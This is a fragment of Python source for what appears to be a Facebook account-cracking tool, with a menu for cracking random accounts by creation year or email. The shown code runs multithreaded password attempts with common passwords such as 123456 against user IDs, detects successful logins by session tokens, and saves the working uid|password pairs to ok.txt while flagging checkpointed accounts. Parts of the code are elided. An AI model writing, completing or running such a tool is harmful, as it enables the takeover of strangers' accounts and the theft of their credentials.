...
class Main:
	def __init__(self):
		...
		print(" \033[0;92m╚══════════════════════════════════╝ ")
		print("\n \033[0;92m(01)\033[0;97m CRACK RANDOM ACOUNT NEW \033[0;91m(2021to2015)\033[0;97m ")
		print(" \033[0;92m(02)\033[0;97m CRACK RANDOM ACOUNT OLD \033[0;91m(2015to2010)\033[0;97m ")
		print(" \033[0;92m(03)\033[0;97m CRACK RANDOM ACOUNT VERY OLD \033[0;91m(2009to2006)\033[0;97m ")
		print(" \033[0;92m(04)\033[0;97m CRACK RANDOM ACOUNT BY EMAIL \033[0;91m(old&new)\033[0;97m ")
	...
	def fbbaru(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [!] CHOOSE ANY PASSWARD EXAMPLE : 123456,12345678")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;91m[Baloch_OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m[Baloch_CP] %s | %s\033[0;97m         "%(uid, pw))
